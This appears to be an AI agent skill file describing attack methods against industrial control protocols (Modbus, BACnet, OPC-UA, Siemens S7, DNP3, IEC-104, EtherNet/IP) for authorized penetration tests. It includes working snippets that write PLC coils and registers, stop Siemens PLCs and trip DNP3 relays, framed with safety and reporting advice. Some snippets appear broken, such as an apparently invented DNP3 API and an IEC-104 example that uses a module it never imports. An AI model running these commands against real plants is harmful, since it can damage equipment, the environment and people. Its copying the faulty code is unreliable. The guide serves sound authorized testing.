---
name: offensive-ics-ot-protocols
description: "Industrial Control Systems (ICS) and Operational Technology (OT) protocol attack methodology — Modbus TCP/RTU read/write without authentication, BACnet building automation enumeration and write attacks, OPC-UA security profile downgrade and anonymous browse, S7 (Siemens PLC) commands via Snap7, DNP3 (electric utility) parsing flaws, EtherNet/IP, IEC 60870-5-104 (electric grid), and the operational/safety implications of OT engagement (do not just send packets without understanding the physical process). Use when the engagement scope includes industrial PLCs, building management, electric grid SCADA, water/wastewater, or manufacturing systems."
---

# ICS / OT Protocol Attacks

OT networks operate physical processes — pumps, valves, motors, breakers. A protocol-level attack here can cause physical damage, environmental harm, or death. Engage only with explicit authorization, full process understanding, and a defined safety abort.

## Quick Workflow

1. Confirm scope and safety preconditions in writing
2. Passively map the OT network (no writes)
3. Identify protocols and devices
4. Test read paths first (information disclosure)
5. Test write paths only after operator-approved process safety review

---

## Pre-Engagement Discipline

Before any active testing on OT:

- **Process Safety Briefing**: understand what the device controls. Pumping station? Boiler temp? Motor speed?
- **Define Abort**: how does the operator stop the test if something goes wrong?
- **Read-Only First**: never write before completing read enumeration
- **Time Window**: known maintenance window, with operator on standby
- **Rollback**: document every config change so it can be reverted
- **No Production**: prefer to test against an offline twin / staging — most mature OT clients have one

If the customer can't give you a maintenance window or a non-production twin, the engagement is read-only enumeration. Period.

## Modbus

Industrial protocol — TCP/502 most common; serial RTU on RS-485 for legacy. **No authentication in the protocol.**

```python
from pymodbus.client import ModbusTcpClient

c = ModbusTcpClient('10.0.0.5', port=502)
c.connect()

# Read coils (digital outputs)
c.read_coils(0, count=20, slave=1)

# Read holding registers (process values)
c.read_holding_registers(0, count=20, slave=1)

# Write coil (turn output on/off)
c.write_coil(40, True, slave=1)

# Write multiple registers (change setpoints)
c.write_registers(40, [1500, 100, 50], slave=1)
```

**Practical impact** depends entirely on what the registers control. A "1" in register 40 might be:
- Cosmetic (flag for HMI display)
- Operational (start a pump)
- Safety-critical (open a relief valve)

Identify the register map before writing. Vendor documentation, HMI configuration files, or process engineer interviews give the map.

### Modbus Master/Slave ID Brute

```python
for slave in range(1, 248):
    try:
        r = c.read_holding_registers(0, count=1, slave=slave)
        if not r.isError():
            print(f"Slave {slave} responds: {r.registers}")
    except: pass
```

## BACnet (Building Automation)

UDP/47808. Used in HVAC, building access control, lighting. Often unauthenticated within the building network.

```bash
# bacnet-stack tools
who-is 10.0.0.0/24    # discovery broadcast
read-property <device-id> <object-type> <object-instance> <property-id>

# Example: read setpoint from analog-output:1
read-property 12345 analog-output 1 present-value
```

Common BACnet writes (with authorization):
- Override setpoint (room temperature, fan speed)
- Issue priority commands (BACnet has priority arrays — high priority forces override)

## OPC-UA

Modern industrial protocol; replaces OPC Classic. Has security profiles but many deployments use `None` for compatibility.

```bash
# Install opcua-client (FreeOpcUa or UaExpert)
python3 -m pip install asyncua

# Browse address space anonymously
python3
>>> from asyncua.sync import Client
>>> c = Client("opc.tcp://10.0.0.5:4840")
>>> c.connect()
>>> objects = c.get_objects_node()
>>> for obj in objects.get_children():
...     print(obj.get_browse_name())
```

Test the security profile:
- `None` — no encryption, no auth
- `Basic128Rsa15` (deprecated) — broken
- `Basic256Sha256` — current
- `Aes128_Sha256_RsaOaep` — current

If the server accepts `None`, anonymous read/write of all values is possible.

### OPC-UA Implementation Bugs

- Self-signed cert auto-accept on client side (MITM)
- User token weak ("anonymous" or fixed username/password defaults)
- Server accepts arbitrary X.509 — no proper PKI
- Subscription flooding (DoS)

## S7 (Siemens)

Siemens PLCs (S7-300, S7-400, S7-1200, S7-1500). Snap7 library.

```python
import snap7

c = snap7.client.Client()
c.connect('10.0.0.5', 0, 1)
# rack=0, slot=1 typical for S7-1200/1500

# Read DB (data block)
data = c.db_read(1, 0, 100)   # DB1, offset 0, 100 bytes

# Write DB (modify process data)
c.db_write(1, 0, b'\x00\x00\x00\x01' * 25)

# Stop the PLC (production-impact)
c.plc_stop()
c.plc_hot_start()
```

S7 historically had no authentication. Modern S7 (S7-1500 with TIA Portal) supports access protection levels. Older PLCs are unauthenticated.

## DNP3 (Electric Utility)

Used in electric grid, water utilities. TCP/20000 most common.

```python
# pyOpenDNP3 / opendnp3-py
import dnp3
c = dnp3.connect('10.0.0.5', 20000)
c.read_static('binary-input', 0, 100)
c.operate('control-relay-output', 0, 'TRIP')   # operates relay (potentially explosive)
```

DNP3 has Secure Authentication v5 (SAv5) — when not deployed, raw read/write is unauthenticated. SAv5 requires both ends to support it, which is rare in older deployments.

## IEC 60870-5-104 (Electric Grid)

European/international utility protocol. TCP/2404. Similar attack patterns to DNP3 — read measurements, send commands.

```python
from c104 import server, client
c = client(ip='10.0.0.5', port=2404, common_address=1)
c.send_command(c104.Type.C_SC_NA_1, ioa=1000, value=True)
```

## EtherNet/IP / CIP (Manufacturing)

Used in Allen-Bradley / Rockwell. TCP/44818.

```python
# pylogix
from pylogix import PLC
c = PLC()
c.IPAddress = '10.0.0.5'
print(c.GetTagList())              # tag enumeration — often broad disclosure
c.Write('Tag_Name', 1)             # write tag
```

## OT Network Mapping (Passive)

```bash
# nmap with NSE scripts (read-only)
nmap -sV --script=modbus-discover,bacnet-info,opcua-info -p 502,4840,44818,47808,2404,20000 <subnet>

# Wireshark capture for protocol identification
sudo tshark -i <iface> -Y "modbus or bacnet or opcua or s7comm or dnp3"
```

## Documentation Sources

- Vendor PLC documentation (Siemens TIA Portal, Allen-Bradley Studio 5000)
- HMI screens — show register-to-physical-process mapping
- Engineering drawings (P&IDs)
- Tag database exports (CSV)
- Process operator interviews (with permission)

## Engagement Cheatsheet

```
[ ] Confirm: scope, time window, rollback plan, abort signal
[ ] Passive mapping (Wireshark + nmap NSE read-only)
[ ] Identify protocols + devices
[ ] Read enumeration — register / tag / object listings
[ ] Map readings to physical process (this step takes most time)
[ ] If write authorized, test on offline twin first
[ ] Production write only with operator standby + safety abort ready
[ ] Document: device, protocol, register/tag, readable/writable, observed effect
```

## Reporting

OT report sections require special care:

- **Process impact** — what physical action could result
- **Operator awareness** — would they see the change in the HMI?
- **Recovery time** — how long to restore from backup config
- **Compensating controls** — segmentation, RTU watchdogs, mechanical safeties
- Vendor + firmware version (affects CVE applicability)
- ICS-CERT / CVE coordination if vendor patch exists

## Detection

| Detection | Defender View |
|---|---|
| OT network IDS (Claroty, Nozomi, Dragos) | Modbus/DNP3/etc. write commands flagged immediately |
| Asset inventory | New/unexpected device identified by behavior |
| Engineering workstation logs | Configuration push attempts logged |
| HMI alarms | Setpoint deviation triggers alarms (process-engineer-defined limits) |

OT engagements are detected fast by mature OT-monitored environments. Plan the engagement with the OT security team's full visibility.

---

## Key References

- ICS-CERT advisories: cisa.gov/ics
- "Industrial Network Security" (Knapp, Langill)
- pymodbus, asyncua, snap7, pyOpenDNP3 docs
- ISA/IEC 62443 — industrial security standard
- Source: https://github.com/SnailSploit/offensive-checklist/blob/main/iot.md
